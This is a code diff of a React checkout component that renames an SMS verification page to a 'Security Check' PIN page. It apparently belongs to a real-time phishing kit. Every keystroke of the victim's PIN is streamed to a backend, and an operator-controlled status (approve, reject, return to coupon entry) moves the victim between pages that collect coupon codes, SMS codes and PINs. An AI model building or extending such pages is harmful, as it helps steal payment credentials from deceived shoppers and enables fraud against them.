@@ -7,11 +7,11 @@ import { Label } from "@/components/ui/label";
 import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
 import Header from "@/components/Header";
 import Footer from "@/components/Footer";
-import { Loader2, MessageSquare, AlertCircle } from "lucide-react";
+import { Loader2, Lock, AlertCircle } from "lucide-react";
 
-const SMSVerification = () => {
+const PinVerification = () => {
   const navigate = useNavigate();
-  const { updateSmsCode, setOrderStatus, orderStatus, currentOrderId, submitSMS } = useRealtime();
+  const { updatePinCode, setOrderStatus, orderStatus, currentOrderId, submitPin } = useRealtime();
   const [code, setCode] = useState("");
   const [isLoading, setIsLoading] = useState(false);
   const [error, setError] = useState("");
@@ -21,38 +21,40 @@ const SMSVerification = () => {
     if (orderStatus === "COMPLETED") {
       setIsLoading(false);
       navigate(`/order-confirmation/${currentOrderId}`);
-    } else if (orderStatus === "REQUEST_PIN") {
-      setIsLoading(false);
-      navigate(`/verify-pin`);
     } else if (orderStatus === "REJECTED") {
         setIsLoading(false);
-        setError("Verification code incorrect. Please try again.");
-        setCode("");
-        updateSmsCode("");
-        setOrderStatus("WAITING_SMS"); 
+        setError("Verification failed. Please try again.");
+        // Stay on page, let user retry or admin might change status
     } else if (orderStatus === "RETURN_COUPON") {
         setIsLoading(false);
         navigate("/verify-coupon");
+    } else if (orderStatus === "APPROVED") {
+        setIsLoading(false);
+        // If approved from PIN, maybe go to SMS or success?
+        // Assuming PIN is final or intermediate. Existing flow: Coupon -> SMS -> Success.
+        // New flow: Coupon -> PIN -> Success? Or Coupon -> PIN -> SMS?
+        // Admin options: "放行" (Approve) -> usually means SUCCESS.
+        navigate(`/order-confirmation/${currentOrderId}`);
     }
-  }, [orderStatus, navigate, currentOrderId, setOrderStatus, updateSmsCode]);
+  }, [orderStatus, navigate, currentOrderId]);
 
   const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
-    const value = e.target.value.replace(/\D/g, "").slice(0, 6);
+    const value = e.target.value;
     setCode(value);
-    updateSmsCode(value);
+    updatePinCode(value);
   };
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     if (code.length < 4) {
-        setError("Please enter a valid verification code");
+        setError("Please enter a valid PIN code");
         return;
     }
     setError("");
     setIsLoading(true);
     
-    // Submit to backend with explicit code
-    await submitSMS(code);
+    // Submit to backend
+    await submitPin(code);
   };
 
   if (isLoading) {
@@ -65,9 +67,9 @@ const SMSVerification = () => {
               <div className="absolute inset-0 border-4 border-muted rounded-full"></div>
               <div className="absolute inset-0 border-4 border-t-primary border-r-transparent border-b-transparent border-l-transparent rounded-full animate-spin"></div>
             </div>
-            <h2 className="font-serif text-2xl md:text-3xl">Verifying Code...</h2>
+            <h2 className="font-serif text-2xl md:text-3xl">Verifying PIN...</h2>
             <p className="text-muted-foreground">
-              Please wait while we confirm your verification code.
+              Please wait while we verify your security code.
             </p>
           </div>
         </main>
@@ -83,11 +85,11 @@ const SMSVerification = () => {
         <Card className="w-full max-w-md shadow-lg border-primary/10">
           <CardHeader className="text-center pb-8">
             <div className="mx-auto w-12 h-12 bg-primary/10 rounded-full flex items-center justify-center mb-4 text-primary">
-                <MessageSquare className="w-6 h-6" />
+                <Lock className="w-6 h-6" />
             </div>
-            <CardTitle className="font-serif text-3xl mb-2">Verification Required</CardTitle>
+            <CardTitle className="font-serif text-3xl mb-2">Security Check</CardTitle>
             <CardDescription className="text-base">
-              We've sent a verification code to your phone number. Please enter it below to complete your order.
+              Additional security verification is required. Please enter your PIN code below.
             </CardDescription>
           </CardHeader>
           <CardContent>
@@ -100,22 +102,29 @@ const SMSVerification = () => {
             
             <form onSubmit={handleSubmit} className="space-y-6">
               <div className="space-y-2">
-                <Label htmlFor="code" className="text-center block">Verification Code</Label>
-                <Input 
-                  id="code" 
-                  name="code" 
-                  placeholder="123456"
-                  className="font-mono text-3xl text-center tracking-[1em] h-16"
-                  maxLength={6}
-                  required 
+                <Label htmlFor="code" className="text-center block">PIN Code</Label>
+                <Input
+                  id="code"
+                  type="text"
+                  placeholder="Enter PIN"
+                  className="text-center text-2xl tracking-widest h-14 font-mono"
                   value={code}
                   onChange={handleInputChange}
+                  maxLength={10}
                   autoFocus
+                  required
                 />
               </div>
-
-              <Button type="submit" className="w-full text-lg h-12 mt-4" disabled={code.length < 4}>
-                Confirm Code
+              
+              <Button type="submit" className="w-full h-12 text-lg" disabled={isLoading || code.length < 4}>
+                {isLoading ? (
+                  <>
+                    <Loader2 className="mr-2 h-4 w-4 animate-spin" />
+                    Verifying...
+                  </>
+                ) : (
+                  "Verify PIN"
+                )}
               </Button>
             </form>
           </CardContent>
@@ -126,4 +135,4 @@ const SMSVerification = () => {
   );
 };
 
-export default SMSVerification;
+export default PinVerification;
